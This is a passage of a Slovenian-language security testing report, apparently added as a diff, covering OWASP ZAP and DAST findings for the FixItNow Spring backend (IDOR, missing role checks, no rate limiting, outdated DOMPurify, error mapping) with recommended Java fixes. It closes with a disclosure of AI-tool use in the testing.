+| **`SEC-05`: Varnostne glave, CORS & ZAP** | 4 *(+68 ZAP)* | **2 / 4** *(60/68 ZAP)* | 2 *(+ZAP opozorila)* | **DELNO ⚠** | Stroga CORS politika in prisotni glavi `nosniff` ter `DENY`, vendar manjka glava `CSP`, Swagger UI pa je javno odprt in vsebuje ranljiv `DOMPurify 3.1.4`. |
+
+---
+
+### 9.4 Poglobljena inženirska analiza odkritih ranljivosti v izvorni kodi in priporočeni popravki (*Security Hardening*)
+
+Kombinacija skenerja **OWASP ZAP** in ciljno usmerjenih **DAST testov** se je izkazala za izjemno učinkovito, saj smo v izvorni kodi zaledja FixItNow natančno locirali vzroke za vse odkrite ranljivosti in pripravili konkretne predloge popravkov:
+
+#### 1. 🔴 Kritična ranljivost (`SEC-03.4` – High Risk, CWE-639): Horizontalni IDOR pri branju podrobnosti servisnega zahtevka (`GET /api/tickets/{ticketId}`)
+- **Kaj se je zgodilo pri testu:** *Stranka A (`sec.victim.a@mail.si`)* je ustvarila zasebni servisni zahtevek z opisom `"Zaupni podatki stranke A: koda alarma 9482"` in domačim naslovom. Nato je *Stranka B (`sec.attacker.b@mail.si`)* s svojim JWT žetonom poslala zahtevek `GET /api/tickets/1`. Strežnik je v **19,9 ms** vrnil status **`200 OK`** s celotno vsebino zahtevka *Stranke A*, zgodovino stanj in bančnimi podatki izvajalca (IBAN/BIC)! Ker so identifikatorji zahtevkov zaporedna cela števila (`Long`: `1, 2, 3...`), lahko vsak prijavljen uporabnik s preprosto zanko prebere vse zahtevke vseh strank v državi.
+- **Vzrok v izvorni kodi (`TicketService.java`, vrstice 215–226):**
+  Metoda `getTicketDetails(Long ticketId, UUID requesterId)` sicer prejme `requesterId` prijavljenega uporabnika, vendar ga uporabi le pri pripenjanju telefonske številke, **nikoli pa ne preveri, ali je `requesterId` dejanski lastnik zahtevka (`ticket.getUser().getId()`) ali dodeljeni izvajalec (`ticket.getAssignedServiceProvider().getId()`)**!
+- **Priporočeni popravek:**
+  V `TicketService.getTicketDetails` je treba takoj po pridobitvi entitete `Ticket` dodati preverjanje lastništva:
+  ```java
+  boolean isOwner = ticket.getUser() != null && ticket.getUser().getId().equals(requesterId);
+  boolean isAssignedProvider = ticket.getAssignedServiceProvider() != null
+      && ticket.getAssignedServiceProvider().getId().equals(requesterId);
+  if (!isOwner && !isAssignedProvider) {
+      throw new AccessDeniedException("You do not have permission to view this ticket.");
+  }
+  ```
+
+#### 2. 🟠 Srednje tveganje (`SEC-03.7` – Medium Risk, CWE-862): Manjkajoča kontrola vloge na končni točki `GET /api/tickets/nearby`
+- **Kaj se je zgodilo pri testu:** Navadna stranka (`role = CUSTOMER`) je poklicala `GET /api/tickets/nearby?latitude=46.5576&longitude=15.6355&radiusKm=25` in prejela status **`200 OK`** s seznamom vseh zahtevkov v okolici.
+- **Vzrok v izvorni kodi (`TicketController.java`, vrstica 217):** Medtem ko imajo metode `getProviderTickets`, `getOpenTickets` in `getMatchingOpenTickets` anotacijo `@PreAuthorize("hasRole('PROVIDER')")`, je bila pri metodi `findNearbyTickets` (`@GetMapping("/nearby")`) ta anotacija pozabljena.
+- **Priporočeni popravek:** Dodati anotacijo `@PreAuthorize("hasRole('PROVIDER') or hasRole('ADMIN')")` nad metodo `findNearbyTickets` v `TicketController.java`.
+
+#### 3. 🟠 Srednje tveganje (`SEC-04.1` – Medium Risk, CWE-307): Odsotnost zaščite pred Brute-Force napadi na `/api/v1/auth/login` in `/api/v1/auth/2fa/verify`
+- **Kaj se je zgodilo pri testu:** Skripta je izvedla 20 zaporednih poskusov prijave z napačnim geslom za isti e-poštni naslov. Vseh 20 klicev je vrnilo `401 Unauthorized` (skupni čas `4.957,9 ms`, tj. ~248 ms na en BCrypt izračun) brez blokade IP naslova ali začasnega zaklepa računa. To napadalcu omogoča tako slovarski napad na gesla kot tudi 6-mestne TOTP kode (`10^6` kombinacij na `/api/v1/auth/2fa/verify`), hkrati pa potrjuje ugotovitev iz Lukovega stresnega testa (poglavje 4.5), da lahko napadalec s poplavo prijav namerno izčrpa procesor (CPU DoS zaradi BCrypt).
+- **Priporočeni popravek:** Uvesti filter za omejevanje hitrosti (**Bucket4j** ali **Resilience4j RateLimiter**, npr. največ 5 neuspešnih poskusov prijave v 5 minutah na IP naslov / e-pošto, nato vrnitev `429 Too Many Requests`).
+
+#### 4. 🔴/🟠 Ranljiva knjižnica v Swagger UI (`ZAP [10003]` – High Risk) in manjkajoče varnostne glave (`ZAP [10038]`, `[90004]`, `[10063]` – Medium/Low Risk)
+- **Kaj je odkril OWASP ZAP:**
+  1. Knjižnica `springdoc-openapi-starter-webmvc-ui:2.6.0` vključuje paket `swagger-ui-bundle.js` z zastarelo knjižnico **`DOMPurify 3.1.4`**, ki ima znane ranljivosti za obvoz XSS zaščite (`CVE-2025-26791`), poleg tega pa je `/swagger-ui/index.html` v `SecurityConfig.java` nastavljen na `permitAll()`, `/v3/api-docs` pa zaradi nezdružljivosti s Spring Boot `3.5.14` vrača `500 Internal Server Error` (`ZAP [90022]`).
+  2. V `SecurityConfig.java` niso konfigurirane glave `Content-Security-Policy`, `Permissions-Policy` in `Cross-Origin-Resource-Policy`.
+- **Priporočeni popravek:**
+  - Nadgraditi `springdoc.version` v `pom.xml` iz `2.6.0` na **`2.8.6+`** (ki je združljiv s Spring Boot `3.5.x` in vsebuje posodobljen `DOMPurify`) ter v produkcijskem profilu (`application-prod.yml`) onemogočiti javni dostop do Swagger UI (`springdoc.swagger-ui.enabled=false`).
+  - V `SecurityConfig.java` v verigo `securityFilterChain` dodati konfiguracijo varnostnih glav:
+    ```java
+    .headers(headers -> headers
+        .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; frame-ancestors 'none';"))
+        .permissionsPolicy(pp -> pp.policy("geolocation=(self), camera=(), microphone=()"))
+    )
+    ```
+
+#### 5. 🟡 Nizko tveganje (`SEC-03.5`, `SEC-03.6` in `ZAP [90022]` – Low Risk, CWE-755): Napačno preslikavanje `AccessDeniedException` v `500 Internal Server Error`
+- **Kaj se je zgodilo pri testu:** Ko je *Stranka B* poskusila preklicati tuj zahtevek (`POST /api/tickets/1/cancel`) ali poklicati skrbniški endpoint (`GET /api/v1/admin/users`), je Spring Security pravilno preprečil dejanje in vrgel `AccessDeniedException` / `AuthorizationDeniedException`. Vendar je razred `GlobalExceptionHandler.java` (vrstica 74) to izjemo ujel v splošni `@ExceptionHandler(Exception.class)` in odjemalcu vrnil **`500 Internal Server Error`** (`"An unexpected error occurred."`) namesto standardne kode **`403 Forbidden`**.
+- **Priporočeni popravek:** V `GlobalExceptionHandler.java` dodati namenski upravljalnik pred splošnim `Exception.class`:
+  ```java
+  @ExceptionHandler(org.springframework.security.access.AccessDeniedException.class)
+  public ResponseEntity<ErrorResponse> handleAccessDenied(AccessDeniedException ex) {
+      return buildResponse(HttpStatus.FORBIDDEN, "Access denied.");
+  }
+  ```
+
+---
+
+### 9.5 Uporaba orodij umetne inteligence (Jan Mrkonjič)
+
+- **Uporabljeni model:** Gemini 4 Argon (v okolju Antigravity IDE).
+- **Obseg uporabe:**
+  1. Načrtovanje 5 varnostnih scenarijev (`SEC-01` do `SEC-05`) po metodologiji OWASP Top 10:2021 in priprava avtomatizirane DAST skripte `naloga4/fixitnow_security_test.py`.
+  2. Konfiguracija in zagon uradnega skenerja **OWASP ZAP 2.17.0** (`ghcr.io/zaproxy/zaproxy:stable`) prek Docker zabojnika ter razčlenjevanje poročil `naloga4/zap_report.json` in `naloga4/rezultati_varnostni_testi.json`.
+  3. Lociranje vzrokov odkritih ranljivosti (IDOR v `TicketService.java`, manjkajoči `@PreAuthorize` v `TicketController.java`, obravnava `AccessDeniedException` v `GlobalExceptionHandler.java`) in oblikovanje priporočil za utrjevanje sistema.
+- **Način verifikacije:** Vsi varnostni testi (21 DAST testnih primerov in 68 pravil skenerja OWASP ZAP) so bili dejansko izvedeni nad delujočim lokalnim zalednim strežnikom FixItNow (`http://localhost:8080`) in bazo PostgreSQL, vsi podatki v tabelah in grafičnih prikazih pa izhajajo neposredno iz shranjenih izpisov `naloga4/zap_report.json` in `naloga4/rezultati_varnostni_testi.json`.
